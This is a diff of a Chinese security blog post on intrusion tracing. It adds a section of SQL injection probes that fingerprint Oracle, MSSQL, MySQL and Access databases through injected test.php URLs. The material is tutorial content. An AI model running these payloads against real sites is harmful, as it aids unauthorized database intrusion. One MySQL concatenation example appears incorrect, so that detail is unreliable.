@@ -107,7 +107,7 @@
 <meta property="og:site_name" content="v1rus blog">
 <meta property="og:description" content="一、 入侵溯源中的常见姿势0x0 前言​    攻击溯源作为安全事故中事后响应的重要组成部分，通过对受害资产与内网流量进行分析一定程度上还原攻击者的攻击路径与攻击手法，有助于修复漏洞与风险避免二次事件的发生。攻击知识可转换成防御优势,如果能够做到积极主动且有预见性，就能更好地控制后果。 ​    简而言之就是如何被黑的要弄明白，再去做好防御。 0x01 主题思路1、web系统​    用户被感知的">
 <meta property="article:published_time" content="2020-12-24T08:12:38.177Z">
-<meta property="article:modified_time" content="2020-12-29T02:36:23.014Z">
+<meta property="article:modified_time" content="2021-01-08T04:09:14.391Z">
 <meta property="article:author" content="Virusday">
 <meta property="article:tag" content="Learn">
 <meta name="twitter:card" content="summary">
@@ -333,8 +333,8 @@
               
                 <span class="post-meta-item-text">更新于&#58;</span>
               
-              <time title="更新于" itemprop="dateModified" datetime="2020-12-29T10:36:23+08:00">
-                2020-12-29
+              <time title="更新于" itemprop="dateModified" datetime="2021-01-08T12:09:14+08:00">
+                2021-01-08
               </time>
             
           </span>
@@ -361,7 +361,7 @@
                   <span class="post-meta-item-text">字数统计&#58;</span>
                 
                 <span title="字数统计">
-                  3.1k
+                  3.5k
                 </span>
               
 
@@ -377,7 +377,7 @@
                   <span class="post-meta-item-text">阅读时长 &asymp;</span>
                 
                 <span title="阅读时长">
-                  11
+                  14
                 </span>
               
             </div>
@@ -513,9 +513,32 @@
 
 <h3 id="3、-数据库类型探测"><a href="#3、-数据库类型探测" class="headerlink" title="3、 数据库类型探测"></a>3、 数据库类型探测</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">WAITFOR DELAY &#39;0:0:4&#39;   &#x2F;&#x2F;mssql 延时四秒</span><br></pre></td></tr></table></figure>
 
+<p><a href="https://www.bugfor.com/web/5167.html" target="_blank" rel="noopener">https://www.bugfor.com/web/5167.html</a></p>
+<p>Orancle:</p>
+<p><strong>1. 通过报错信息判断</strong></p>
+<blockquote>
+<p>ORA-01756:quoted string not properly terminated</p>
+<p>ORA-00933:SQLcommand not properly ended</p>
+</blockquote>
+<p><strong>2. 通过连接符判断</strong></p>
+<blockquote>
+<p>‘1’||’1’=’11’</p>
+<p>concat(‘1′,’1′)=’11’</p>
+</blockquote>
+<p><strong>3. 通过特有数据表判断</strong></p>
+<blockquote>
+<p>and (select count(*) from sys.user_tables)&gt;0</p>
+</blockquote>
+<p><strong>4. 通过length函数判断</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">可以使用length,不能使用len.  len(&#39;a&#39;)&#x3D;1  （报错）</span><br></pre></td></tr></table></figure>
+
+<p><strong>5. 通过substr函数判断</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">只能使用substr,不能用substring。</span><br></pre></td></tr></table></figure>
 
 
 
+<p>总的判断原则：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">一、各个数据库特有的数据表来判断：</span><br><span class="line"></span><br><span class="line">    1、mssql数据库</span><br><span class="line"></span><br><span class="line">      http:&#x2F;&#x2F;127.0.0.1&#x2F;test.php?id&#x3D;1 and (select count(*) from sysobjects)&gt;0 and 1&#x3D;1</span><br><span class="line"></span><br><span class="line">    2、access数据库</span><br><span class="line"></span><br><span class="line">      http:&#x2F;&#x2F;127.0.0.1&#x2F;test.php?id&#x3D;1 and (select count(*) from msysobjects)&gt;0 and 1&#x3D;1</span><br><span class="line"></span><br><span class="line">    3、mysql数据库(mysql版本在5.0以上)</span><br><span class="line"></span><br><span class="line">      http:&#x2F;&#x2F;127.0.0.1&#x2F;test.php?id&#x3D;1 and (select count(*) from information_schema.TABLES)&gt;0 and 1&#x3D;1</span><br><span class="line"></span><br><span class="line">    4、oracle数据库</span><br><span class="line"></span><br><span class="line">      http:&#x2F;&#x2F;127.0.0.1&#x2F;test.php?id&#x3D;1 and (select count(*) from sys.user_tables)&gt;0 and 1&#x3D;1</span><br><span class="line"></span><br><span class="line">二、通过各数据库特有的连接符判断数据库类型：</span><br><span class="line"></span><br><span class="line">    1、mssql数据库</span><br><span class="line"></span><br><span class="line">     http:&#x2F;&#x2F;127.0.0.1&#x2F;test.php?id&#x3D;1 and &#39;1&#39; + &#39;1&#39; &#x3D; &#39;11&#39;</span><br><span class="line"></span><br><span class="line">    2、mysql数据库</span><br><span class="line"></span><br><span class="line">     http:&#x2F;&#x2F;127.0.0.1&#x2F;test.php?id&#x3D;1 and &#39;1&#39; + &#39;1&#39; &#x3D; &#39;11&#39;</span><br><span class="line"></span><br><span class="line">     http:&#x2F;&#x2F;127.0.0.1&#x2F;test.php?id&#x3D;1 and CONCAT(&#39;1&#39;,&#39;1&#39;)&#x3D;&#39;11&#39;</span><br><span class="line"></span><br><span class="line">    3、oracle数据库</span><br><span class="line"></span><br><span class="line">     http:&#x2F;&#x2F;127.0.0.1&#x2F;test.php?id&#x3D;1 and &#39;1&#39;||&#39;1&#39;&#x3D;&#39;11&#39;</span><br><span class="line"></span><br><span class="line">     http:&#x2F;&#x2F;127.0.0.1&#x2F;test.php?id&#x3D;1 and CONCAT(&#39;1&#39;,&#39;1&#39;)&#x3D;&#39;11&#39;</span><br><span class="line">三、 有回显信息的话报错看更好</span><br></pre></td></tr></table></figure>
 
 
 
@@ -776,7 +799,7 @@
     
       <span class="post-meta-item-text">Site words total count&#58;</span>
     
-    <span title="Site words total count">56.2k</span>
+    <span title="Site words total count">58.6k</span>
   
 </div>
 -->
